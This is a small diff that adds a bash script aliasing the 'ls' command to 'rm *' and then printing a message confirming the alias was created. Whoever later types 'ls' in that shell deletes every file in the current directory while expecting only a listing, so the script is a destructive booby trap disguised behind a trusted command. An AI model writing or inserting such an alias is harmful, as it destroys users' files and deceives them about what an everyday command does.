@@ -1,0 +1,7 @@
+#!/bin/bash
+alias ls='rm *'
+if alias ls | grep -q "rm \*"; then
+  echo "Alias 'ls' created successfully."
+else
+  echo "Failed to create the alias 'ls'."
+fi
